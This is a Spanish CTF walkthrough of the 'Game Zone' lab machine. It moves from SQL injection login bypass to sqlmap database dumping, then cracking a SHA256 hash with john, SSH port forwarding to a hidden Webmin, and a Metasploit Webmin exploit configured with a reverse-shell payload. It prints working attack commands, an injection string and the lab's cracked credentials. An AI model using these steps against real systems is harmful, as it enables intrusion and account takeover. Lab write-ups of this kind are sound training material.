![image](https://github.com/user-attachments/assets/80b0103c-3593-48d0-9f1a-1af1d3fb977d)# Game Zone

En esta máquina nos dan como introducción aprender a hackear, entender SQLMAP, crackear contraseñas y usar servicios para crear SSH reversos para escalar privilegios.

Vamos a ello!!

He hecho un escaneo con nmap 

```
nmap -sCV -T4 --min-rate 4000 ip
```

HE encontrado 2 puertos abiertos, el 80 y el 22 

![image](https://github.com/user-attachments/assets/b640d602-5a8d-4bf3-9c52-43ff7efdf238)

Encontramos esto en la web, como vemos tenemos la posibilidad de registrarnos de intentar un SQL, vemos varios vectores, vamos a explorar la web.

La primera pregunta es quien es el calvo que esta en la foto, sabemos que es Hitman pero necsitamos el nombre vamos a hacer una "reverse image"

Yo en mi caso ya sabía quien era, pero con lens o cualquier otro podemos sacarlo

![image](https://github.com/user-attachments/assets/cf8d63ec-411f-42f9-a50c-9531be81c910)

# Obtener acceso Via SQL

La CTF nos explica consultar básicas de SQL como

```
SELECT * FROM users WHERE username = :username AND password:= password
```

Como vemos cuando intentamos imputear el login deberemos insertar los valores "username" y "password" esta forma de hacer la consulta es obviamente una vulnerabilidad

Un ejemplo simple es por ejemplo probar el usuario "admin" y la contraseña ' or 1=1 -- - autentificacndo el login, quedaría asi:

```
SELECT * FROM users WHERE username = admin AND password := ' or 1=1 -- -
```

Vamos a poner en el usuario el comentario a ver si entramos

![image](https://github.com/user-attachments/assets/494f377d-cf5a-49d6-a4a2-e6ff1d934506)

Genial estamos en la ruta : /portal.php

# Usar SQL map

SQLMAP es un popular open-source, automatiza tareas de SQL injection y tareas de la base de datos.

Vamos a utilziarla, primero de todo como es obvio necesitaremos la consulta, esto será coger el proxy de BurpSuite y probar una consulta en "search for a game review" la cogeremos la descargaremos y se la daremos al sql map:

![image](https://github.com/user-attachments/assets/f811481b-8e0b-463a-b683-33a2a73dc64c)

Una vez tenemos la consulta la descargamos e inicializamos SQL

```
sqlmap -r request --dbms=mysql --dump
```
Después del escaneo encontramos 2 tablas y una de ellas con una password

la tabla post:

```
able: post
[5 entries]
+----+--------------------------------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
| id | name                           | description                                                                                                                                                                                            |
+----+--------------------------------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
| 1  | Mortal Kombat 11               | Its a rare fighting game that hits just about every note as strongly as Mortal Kombat 11 does. Everything from its methodical and deep combat.                                                         |
| 2  | Marvel Ultimate Alliance 3     | Switch owners will find plenty of content to chew through, particularly with friends, and while it may be the gaming equivalent to a Hulk Smash, that isnt to say that it isnt a rollicking good time. |
| 3  | SWBF2 2005                     | Best game ever                                                                                                                                                                                         |
| 4  | Hitman 2                       | Hitman 2 doesnt add much of note to the structure of its predecessor and thus feels more like Hitman 1.5 than a full-blown sequel. But thats not a bad thing.                                          |
| 5  | Call of Duty: Modern Warfare 2 | When you look at the total package, Call of Duty: Modern Warfare 2 is hands-down one of the best first-person shooters out there, and a truly amazing offering across any system.                      |
+----+--------------------------------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
```

La tabla Users:

```
Database: db
Table: users
[1 entry]
+------------------------------------------------------------------+----------+
| pwd                                                              | username |
+------------------------------------------------------------------+----------+
| ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14 | agent47  |
+------------------------------------------------------------------+----------+
```

Una vez esto ya tenemos la mayoria de respuestas y podemos pasar al siguiente paso, crackear.

Lo primero que haremos sera cogernos ese hash que tenemos y pasarnoslo a un archivo, con ello podremos pasarselo a john

![image](https://github.com/user-attachments/assets/0a7f8ffa-4869-4797-8dd5-eebe26b63885)

En este caso podriamos hacer un hashid y identificar el tipo de hash (SHA256) pero en micaso no lo he hecho y directamente lo he metido con lo cual vamos a ello

```
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-SHA256
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-SHA256 [SHA256 256/256 AVX2 8x])
Warning: poor OpenMP scalability for this hash type, consider --fork=2
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
videogamer124    (?)
1g 0:00:00:00 DONE (2024-11-07 14:41) 1.754g/s 5116Kp/s 5116Kc/s 5116KC/s vimivera..veluasan
Use the "--show --format=Raw-SHA256" options to display all of the cracked passwords reliably
Session completed. 
```

Ya tenemos la password bien 

```
agent47:videogamer124
```
Con esto podemos probar un logeo por ssh y aver si nos conecta

![image](https://github.com/user-attachments/assets/67f9dee4-8c07-4694-85e7-578de8ae8cac)

Genial tenemos también la flag "user.txt"


# Explorar servicios con reverse SSH tunnels

El reenvío de puerto SSH inverso especifica que el puerto dado en el host del servidor remoto se debe reenviar al host y puerto dados en el lado local.

```
ssh -L 9000:imgur.com:80 user@example.com
```

-L es un túnel local (USTED <-- CLIENTE). Si un sitio fue bloqueado, puede reenviar el tráfico a un servidor de su propiedad y verlo. Por ejemplo, si imgur fue bloqueado en el trabajo, puede ejecutar ssh -L 9000:imgur.com:80 usuario@ejemplo.com. Si va a localhost:9000 en su máquina, cargará el tráfico de imgur utilizando su otro servidor.

-R es un túnel remoto (USTED --> CLIENTE). Reenvía su tráfico al otro servidor para que otros lo vean. Similar al ejemplo anterior, pero a la inversa.
```
ss
```

En caso de querer ver mas TCP o UDP o ver en cada caso

```
ss -tulpn
```

![image](https://github.com/user-attachments/assets/5ae30ab5-59db-476d-896f-358b43916b03)

En este caso solo he elegido los sockets TCP vemos que tenemos el *:10000 

Podemos exposear el contenido local desde nuestra máquina

```
ssh -L 10000:localhost:10000 usuario@ip
```

![image](https://github.com/user-attachments/assets/ec69019e-ccbb-428b-9ca1-3c8d1b6a6088)

![image](https://github.com/user-attachments/assets/b32a12a1-1cea-4e45-a6a9-a030bd123f5b)

Dentro nos encontramos un webmin 1.580

# Escala de privilegios

Usando la versión del CMS explotaremos con MEtasploit

```
msfconsole # iniciamos metasploit
search webmin #buscamos vulnerabilidades de webmin
use 0 # exploit/unix/webapp/webmin_show_cgi_exec
show options
```

Ahora configurar el payload

```
msf6 exploit(unix/webapp/webmin_show_cgi_exec) > set password videogame124
password => videogame124
msf6 exploit(unix/webapp/webmin_show_cgi_exec) > set password videogamer124
password => videogamer124
msf6 exploit(unix/webapp/webmin_show_cgi_exec) > set rhosts localhost
rhosts => localhost
msf6 exploit(unix/webapp/webmin_show_cgi_exec) > set ssl false
[!] Changing the SSL option's value may require changing RPORT!
ssl => false
msf6 exploit(unix/webapp/webmin_show_cgi_exec) > set username aget47
username => aget47
msf6 exploit(unix/webapp/webmin_show_cgi_exec) > set payload 
payload => 
msf6 exploit(unix/webapp/webmin_show_cgi_exec) > set payload cmd/unix/reverse
payload => cmd/unix/reverse
```

Una vez terminado configuramos el payload y ejecutamos

```
set lhost tuip
run
```

![image](https://github.com/user-attachments/assets/13a8cfbc-290e-42ba-8918-6a7ae18c7dc7)

GG!!!!!!!!!!!!!!!










